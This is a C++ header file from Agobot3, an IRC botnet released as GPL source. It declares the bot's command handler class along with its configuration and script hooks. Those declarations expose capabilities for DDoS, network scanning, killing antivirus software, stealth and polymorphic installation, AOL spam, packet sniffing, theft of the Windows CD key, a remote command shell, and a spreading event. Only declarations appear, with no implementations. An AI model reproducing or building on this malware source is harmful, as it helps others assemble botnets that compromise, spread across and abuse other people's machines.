/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __BOT_H__
#define __BOT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"

class CBot : public CCommandHandler
{
public:
	CBot();
	void Init();
	void Config();
	void Autostart();
	void Recv(CMessage *pMsg, bool bInternal=false);
	bool HandleMsg(CMessage *pMsg);
	bool HandleMsgInt(CMessage *pMsg);
	bool HandleFallBack(CMessage *pMsg);
	bool Think();

	CString SysInfo();
	CString LongUptime(int iDays);
	int UptimeDays();
	CString Status();

	void RunScript(unsigned long lEvent);

	bool m_bJoined;
	unsigned long m_lStartTime;

	cvar	si_nickprefix, si_servpass, si_server, si_port, si_chanpass, si_mainchan, si_nick, si_usessl,
			bot_version, bot_filename, bot_id, bot_prefix, bot_ftrans_port, bot_ftrans_port_ftp, bot_timeout,
			bot_seclogin, bot_compnick, bot_randnick, bot_meltserver, bot_topiccmd,
			as_valname, as_enabled, as_service, as_service_name, do_speedtest,do_avkill,do_stealth,
			inst_polymorph,
			scan_maxthreads, scan_maxsockets,
			ddos_maxthreads,
			redir_maxthreads,
			spam_aol_channel, spam_aol_enabled,
			identd_enabled, cdkey_windows,
			sniffer_enabled, sniffer_channel, scaninfo_level,
			scaninfo_chan, bot_cmdshell, vuln_channel;

	bool HandleCommand(CMessage *pMsg);

	command	m_cmdRemove, m_cmdStatus, m_cmdRndNick, m_cmdDie, m_cmdId, m_cmdAbout,
			m_cmdSysInfo, m_cmdLongUptime, m_cmdNick, m_cmdOpen, m_cmdDns, m_cmdRemoveAllBut,
			m_cmdExecute, m_cmdQuit, m_cmdFlushDNS, m_cmdSecure, m_cmdUnSecure, m_cmdCommand,
			m_cmdHighSpeed;
	
	irc_server  m_isServerRoot, m_isServer0, m_isServer1, m_isServer2, m_isServer3, m_isServer4,
				m_isServer5, m_isServer6, m_isServer7;
};

#define SCRIPT_UNKNOWN		0	// Hmmmm....
#define SCRIPT_ONSTART		1	// Runs when the bot starts up
#define SCRIPT_ONCONNECT	2	// Runs when the bot connected to the server
#define SCRIPT_ONJOIN		3	// Runs when the bot joins the channel
#define SCRIPT_ONLOGIN		4	// Runs when someone logs into the bot
#define SCRIPT_ONDISCON		5	// Runs when the bot disconnects from the server
#define SCRIPT_ONREMOVE		6	// Runs when the bot is removed from the system
#define SCRIPT_ONSPREAD		7	// Runs when the bot spreads to another host
#define SCRIPT_ONDEBUG		8	// Runs when a debugger was attached to the process
#define SCRIPT_ONTIMER		9	// Runs after a specified
#define SCRIPT_ONSTARTUPFIN	10	// Runs after the startup thread finished

typedef struct scriptcmd_s {
	CString			sScriptCmd;
	unsigned long	lScriptType;
} scriptcmd;

extern list<scriptcmd> g_lScriptCmds;

#endif // __BOT_H__
